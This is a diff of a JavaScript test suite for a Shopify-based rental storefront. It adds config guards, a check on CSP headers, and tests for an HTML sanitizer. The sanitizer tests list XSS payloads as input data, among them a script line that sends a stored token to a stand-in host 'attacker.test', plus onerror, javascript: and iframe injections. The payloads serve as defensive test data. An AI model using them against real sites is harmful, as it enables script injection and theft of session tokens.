@@ -159,9 +159,31 @@ test('Railway uses the package start command and preserves migrations and health
   assert.equal(railway.deploy.healthcheckPath, '/health');
   assert.deepEqual(railway.deploy.preDeployCommand, ['pnpm --filter @valle/reservations-api run db:migrate']);
 });
-test('Shopify production config audits order creation before payment', () => {
+test('Shopify production config audits order creation before payment and syncs updates/deletes', () => {
   const config = read('apps/shopify-app/shopify.app.production.toml');
-  assert.match(config, /topics\s*=\s*\[\s*"orders\/create",\s*"orders\/paid",\s*"orders\/cancelled",\s*"refunds\/create"\s*\]/);
+  assert.match(config, /topics\s*=\s*\[\s*"orders\/create",\s*"orders\/paid",\s*"orders\/cancelled",\s*"orders\/updated",\s*"orders\/delete",\s*"refunds\/create"\s*\]/);
+});
+test('no draft config can target the production app, and production scopes are never placeholders', () => {
+  // `shopify app config use <nome>` + `deploy` publica o arquivo escolhido
+  // POR CIMA da config remota do app que o `client_id` apontar. Um rascunho
+  // com o client_id de produção e scopes PLACEHOLDER zera os scopes do app
+  // real e derruba a instalação da loja junto com os webhooks de aluguel —
+  // o cabeçalho de shopify.app.toml registra que isso já aconteceu uma vez.
+  const clientIdOf = (file) => (read(`apps/shopify-app/${file}`).match(/^client_id\s*=\s*"([^"]*)"/m) ?? [])[1];
+  const scopesOf = (file) => (read(`apps/shopify-app/${file}`).match(/^scopes\s*=\s*"([^"]*)"/m) ?? [])[1];
+
+  const productionClientId = clientIdOf('shopify.app.production.toml');
+  assert.ok(productionClientId, 'shopify.app.production.toml precisa declarar client_id');
+  assert.doesNotMatch(scopesOf('shopify.app.production.toml') ?? '', /PLACEHOLDER/,
+    'a config de produção nunca pode ir ao ar com scopes placeholder');
+
+  const drafts = readdirSync(new URL('apps/shopify-app/', root))
+    .filter((file) => /^shopify\.app\..*\.toml$/.test(file) && file !== 'shopify.app.production.toml');
+  assert.ok(drafts.length > 0, 'a guarda só faz sentido se houver outros arquivos de config para vigiar');
+  for (const draft of drafts) {
+    assert.notEqual(clientIdOf(draft), productionClientId,
+      `${draft} carrega o client_id de produção: um deploy a partir dele sobrescreve o app real`);
+  }
 });
 test('active application code has no direct Mercado Pago integration', () => {
   const source = [
@@ -175,6 +197,79 @@ test('reservation confirmation never mutates Shopify inventory or captures/refun
   const webhook = read('apps/reservations-api/src/webhooks/webhooks.service.ts');
   assert.match(webhook, /case 'orders\/paid'/);
   assert.doesNotMatch(webhook, /mutation\s+\w*(?:inventory|refund|paymentCapture|orderEdit)/i);
+});
+
+// ---------------------------------------------------------------------------
+// Descrição da peça — HTML escrito no admin da Shopify, renderizado na nossa
+// origem, que é a mesma do /closetadmin. Ver lib/product-description.ts.
+// ---------------------------------------------------------------------------
+
+function loadSanitizer() {
+  return load('apps/marketing/src/lib/product-description.ts', {
+    require: (id) => {
+      if (id === 'server-only') return {};
+      const mod = require(id);
+      // transpileModule sem esModuleInterop emite `mod.default`; sanitize-html
+      // é CommonJS e exporta a função direto.
+      return typeof mod === 'function' ? Object.assign(mod, { default: mod }) : mod;
+    },
+  });
+}
+
+test('product description keeps its formatting but never executable content', () => {
+  const { sanitizeProductDescription } = loadSanitizer();
+  const kept = sanitizeProductDescription(
+    '<p>Casaco <strong>impermeável</strong></p><ul><li>Tamanho M</li></ul><h3>Cuidados</h3>',
+  );
+  assert.match(kept, /<p>Casaco <strong>impermeável<\/strong><\/p>/);
+  assert.match(kept, /<li>Tamanho M<\/li>/);
+  assert.match(kept, /<h3>Cuidados<\/h3>/);
+
+  for (const payload of [
+    '<script>fetch("https://attacker.test?c="+localStorage.holdToken)</script>',
+    '<img src=x onerror="alert(1)">',
+    '<a href="javascript:alert(1)">clique</a>',
+    '<iframe src="https://attacker.test"></iframe>',
+    '<svg><animate onbegin="alert(1)" attributeName="x"></svg>',
+    '<object data="data:text/html,<script>alert(1)</script>"></object>',
+    '<style>@import url("https://attacker.test")</style>',
+    '<form action="https://attacker.test"><input name="a"></form>',
+    '<base href="https://attacker.test/">',
+    '<xmp><script>alert(1)</script></xmp>',
+  ]) {
+    const clean = sanitizeProductDescription(payload);
+    assert.doesNotMatch(clean, /<\s*(script|iframe|object|embed|style|form|base|svg|animate|xmp)\b/i, payload);
+    assert.doesNotMatch(clean, /\son\w+\s*=/i, payload);
+    assert.doesNotMatch(clean, /javascript:/i, payload);
+    assert.doesNotMatch(clean, /attacker\.test/i, payload);
+  }
+});
+
+test('the product page never renders Shopify description HTML unsanitized', () => {
+  const page = read('apps/marketing/src/app/pecas/[handle]/page.tsx');
+  assert.match(page, /sanitizeProductDescription\(/);
+  // O valor entregue ao dangerouslySetInnerHTML tem de ser o sanitizado, nunca
+  // o campo cru vindo da Storefront API.
+  assert.doesNotMatch(page, /__html:\s*product\.descriptionHtml/);
+  assert.match(page, /const descriptionHtml = sanitizeProductDescription\(/);
+});
+
+test('the storefront ships a CSP and a Permissions-Policy', () => {
+  const config = read('apps/marketing/next.config.mjs');
+  assert.match(config, /key: 'Content-Security-Policy'/);
+  assert.match(config, /key: 'Permissions-Policy'/);
+  for (const directive of [
+    "default-src 'self'",
+    "base-uri 'self'",
+    "object-src 'none'",
+    "frame-ancestors 'none'",
+    "form-action 'self'",
+  ]) {
+    assert.ok(config.includes(directive), `CSP precisa manter a diretiva ${directive}`);
+  }
+  // `connect-src` sai das variáveis de ambiente do próprio cliente; um host
+  // fixo escrito à mão ficaria errado quando a API mudasse de endereço.
+  assert.doesNotMatch(config, /connect-src[^`]*https:\/\/[a-z0-9-]+\.(up\.railway\.app|vercel\.app)/i);
 });
 
 // ---------------------------------------------------------------------------
